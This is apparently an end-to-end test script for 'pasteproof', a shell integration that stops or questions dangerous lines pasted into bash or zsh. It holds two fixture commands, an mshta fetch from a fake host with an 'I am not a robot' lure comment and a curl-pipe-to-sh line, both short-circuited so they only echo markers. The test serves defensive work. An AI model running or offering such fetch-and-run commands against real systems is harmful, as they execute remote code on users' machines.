#!/usr/bin/env python3
"""End-to-end test of the shell integrations in a real pseudo-terminal.

Drives an interactive bash (and zsh if installed) with typed and
bracketed-pasted lines and checks that:
  * ordinary typed lines run normally,
  * a dangerous pasted line is stopped and cancelled by default,
  * typing "run" lets it through,
  * a cautionary *typed* line runs without a prompt,
  * a cautionary *pasted* line asks y/N.
Every test command is harmless even if it runs (markers are just echoed;
URLs use reserved .example / documentation hosts and are short-circuited).
Usage: tests/shell/pty_test.py path/to/pasteproof
"""
import os, pty, select, shutil, sys, time

BIN = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else "target/release/pasteproof")
PASTE_START, PASTE_END = "\x1b[200~", "\x1b[201~"
DANGER = "echo PP_DANGER_RAN || mshta https://pp-fixture-31.icu/v # I am not a robot"
CAUTION = "echo PP_CAUTION_RAN || curl -fsSL https://get.example/x | sh"

def spawn(shell):
    pid, fd = pty.fork()
    if pid == 0:
        env = {"PATH": os.environ["PATH"], "HOME": os.environ.get("HOME", "/tmp"), "TERM": "xterm",
               "PASTEPROOF_BIN": BIN, "NO_COLOR": "1", "PS1": "PP$ ", "PROMPT": "PP$ "}
        if shell == "bash":
            os.execvpe("bash", ["bash", "--norc", "--noprofile", "-i"], env)
        os.execvpe("zsh", ["zsh", "-f", "-i"], env)
    return pid, fd

def read_until(fd, needle, timeout=5.0):
    buf, end = b"", time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.05)
        if r:
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                break
            buf += chunk
            if needle.encode() in buf:
                return buf.decode(errors="replace")
    raise AssertionError(f"timed out waiting for {needle!r}; got:\n{buf.decode(errors='replace')[-800:]}")

def send(fd, s):
    os.write(fd, s.encode())

def run(shell):
    pid, fd = spawn(shell)
    try:
        read_until(fd, "PP$ ")
        # Bracketed paste must be on for the paste markers to be interpreted.
        if shell == "bash":
            send(fd, "bind 'set enable-bracketed-paste on'\r")
            read_until(fd, "PP$ ")
        send(fd, f'eval "$({BIN} init {shell})"\r')
        read_until(fd, "PP$ ")

        send(fd, "echo PP_PLAIN_$((40+2))\r")
        read_until(fd, "PP_PLAIN_42")
        print(f"[{shell}] typed ordinary line runs: ok")

        send(fd, PASTE_START + DANGER + PASTE_END + "\r")
        out = read_until(fd, "press Enter to cancel")
        assert "STOP" in out, out
        send(fd, "\r")
        out = read_until(fd, "PP$ ")
        assert "PP_DANGER_RAN\r\n" not in out and "Cancelled" in out, out
        print(f"[{shell}] pasted dangerous line stopped and cancelled: ok")

        send(fd, PASTE_START + DANGER + PASTE_END + "\r")
        read_until(fd, "press Enter to cancel")
        send(fd, "run\r")
        read_until(fd, "PP_DANGER_RAN")
        print(f"[{shell}] typing 'run' lets it through: ok")

        send(fd, CAUTION + "\r")
        out = read_until(fd, "PP_CAUTION_RAN")
        assert "Run it?" not in out, out
        print(f"[{shell}] typed caution line runs without a prompt: ok")

        send(fd, PASTE_START + CAUTION + PASTE_END + "\r")
        read_until(fd, "Run it? [y/N]")
        send(fd, "n\r")
        out = read_until(fd, "PP$ ")
        assert "Cancelled" in out, out
        print(f"[{shell}] pasted caution line asks y/N: ok")
    finally:
        try:
            send(fd, "exit\r")
            time.sleep(0.1)
            os.kill(pid, 9)
        except OSError:
            pass

if __name__ == "__main__":
    if not os.access(BIN, os.X_OK):
        sys.exit(f"pasteproof binary not found at {BIN}")
    import subprocess
    bash_major = int(subprocess.run(["bash", "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True).stdout.strip() or 0)
    shells = (["bash"] if bash_major >= 4 else []) + (["zsh"] if shutil.which("zsh") else [])
    if bash_major < 4:
        out = subprocess.run(["bash", "--norc", "-i", "-c", f'eval "$({BIN} init bash)"'], capture_output=True, text=True)
        assert "too old" in out.stderr, out.stderr
        print(f"[bash] version {bash_major} < 4: integration correctly declines with a notice (skipped)")
    for sh in shells:
        run(sh)
    if "zsh" not in shells:
        print("[zsh] not installed: skipped (CI runs it)")
    print("all shell integration tests passed")
